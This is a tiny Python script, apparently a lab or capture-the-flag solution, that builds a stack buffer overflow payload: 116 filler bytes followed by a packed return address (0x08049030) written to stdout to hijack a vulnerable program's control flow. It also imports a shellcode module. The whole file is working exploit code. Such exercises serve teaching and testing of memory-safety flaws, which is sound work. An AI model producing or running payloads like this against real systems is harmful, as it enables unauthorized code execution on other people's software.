from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write(('\x12'*116).encode('ASCII') + pack("<I", 0x08049030))